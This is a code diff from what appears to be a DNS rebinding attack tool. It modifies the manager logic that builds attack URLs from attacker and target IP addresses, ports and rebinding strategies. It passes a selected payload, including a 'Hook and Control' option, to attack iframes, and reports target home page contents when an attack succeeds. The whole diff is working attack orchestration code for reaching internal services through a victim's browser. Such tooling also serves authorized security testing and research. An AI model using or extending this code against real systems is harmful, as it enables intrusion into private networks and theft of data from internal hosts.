@@ -30,6 +30,7 @@ const Configuration = () => {
     let targetHostIPAddress = null;
     let dummyPort = null;
     let indexToken = null;
+    let attackPayload = null;
     let interval = null;
     let rebindingStrategy = null;
     let flushDns = null;
@@ -128,6 +129,12 @@ const Configuration = () => {
         getIndexToken() {
             return indexToken;
         },
+        getAttackPayload() {
+            return attackPayload;
+        },
+        setAttackPayload(attackPayloadName) {
+            attackPayload = attackPayloadName;
+        },
         getInterval() {
             return interval;
         },
@@ -153,6 +160,7 @@ const Configuration = () => {
             flushDns = configObject.flushDns;
             interval = configObject.interval;
             indexToken = configObject.indexToken;
+            attackPayload = configObject.attackPayload;
             hideActivity = configObject.hideActivity;
             delayDOMLoad = configObject.delayDOMLoad;
             rebindingSuccessFn = configObject.rebindingSuccessFn;
@@ -334,7 +342,7 @@ const App = () => {
         document.getElementById('flushdns').checked = configuration.getFlushDns();
     };
 
-    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {
+    function generateAttackUrl(targetHostIPAddress, targetPort) {
         return hosturl
             .replace("%1", configuration.getAttackHostIPAddress())
             .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
@@ -342,7 +350,7 @@ const App = () => {
             .replace("%4", configuration.getRebindingStrategy())
             .replace("%5", configuration.getAttackHostDomain())
             .replace("%6", targetPort)
-            .replace("%7", payload + "?rnd=" + Math.random())
+            .replace("%7", "soopayload.html" + "?rnd=" + Math.random())
     };
 
     return {
@@ -353,9 +361,10 @@ const App = () => {
             return configuration;
         },
 
-        attackTarget(targetHostIPAddress, targetPort, payload) {
+        attackTarget(targetHostIPAddress, targetPort) {
             let self = this;
-            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload))
+            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, 
+                self.getConfiguration().getAttackPayload()));
 
             self.addFrameToDOM(self.getFrameManager().frame(fid));
             self.getFrameManager().frame(fid).setTimer(setInterval((() => {
@@ -426,8 +435,12 @@ const App = () => {
             };
 
             if (msg.data.status == "start") {
-                console.log("Iframe reports that attack has started");
+                console.log(`Iframe reports that attack has started: ${msg.origin}`);
                 clearInterval(fm.frame(fid).getTimer());
+                msg.source.postMessage({
+                    cmd: "payload",
+                    param: configuration.getAttackPayload()
+                }, "*");
                 msg.source.postMessage({
                     cmd: "interval",
                     param: configuration.getInterval()
@@ -457,19 +470,19 @@ const App = () => {
                 document.getElementById(fid).contentWindow.postMessage({
                     cmd: "stop"
                 }, "*");
-                console.log("This resource requires HTTP authentication. Cannot access without user noticing.");
+                console.log(`This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}`);
             }
 
             // Possibly a firewalled or closed port. Possibly a non-HTTP service.
             if (msg.data.status === "error") {
                 fm.frame(fid).incrementErrorCount();
-                console.log("error");
+                console.log(`error: ${msg.origin}`);
 
                 if (fm.frame(fid).getErrorCount() == 5) {
                     document.getElementById(fid).contentWindow.postMessage({
                         cmd: "stop"
                     }, "*");
-                    console.log("Too many errors. Stopping.");
+                    console.log(`Too many errors, stopping: ${msg.origin}`);
                 }
             }
 
@@ -484,6 +497,10 @@ const App = () => {
             const UiFlushDns = document.getElementById("flushdns").checked;
             configuration.setFlushDns(UiFlushDns);
 
+            const UiAttackPayloadName = document.getElementById("payloads").value;
+            configuration.setAttackPayload(UiAttackPayloadName);
+            
+
             let fid = fm.addFrame(hosturl
                 .replace("%1", document.getElementById("attackhostipaddress").value)
                 .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
@@ -491,7 +508,8 @@ const App = () => {
                 .replace("%4", document.getElementById("rebindingStrategy").value)
                 .replace("%5", document.getElementById("attackhostdomain").value)
                 .replace("%6", document.getElementById("targetport").value)
-                .replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
+                //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
+                .replace("%7", "soopayload.html") + "?rnd=" + Math.random());
 
             self.addFrameToDOM(fm.frame(fid));
 
@@ -508,11 +526,13 @@ const App = () => {
 }
 
 function rebindingSuccessCb(msg) {
-    console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
+    console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
     if ((app.getConfiguration().getAlertSuccess() !== "false") &&
         (app.getConfiguration().getType() === "manager") &&
-        (document.getElementById("payloads").value !== "payload-hook-and-control.html")) {
-        alert("Attack Successful: " + document.domain + " " + msg.data.response);
+        (document.getElementById("payloads").value !== "Hook and Control")) {
+        alert("Attack Successful from " + document.domain + ".\n" 
+        + "Origin: \n" + msg.origin + ".\n" 
+        + "Target home page contents:\n" + msg.data.response);
     }
 
 }
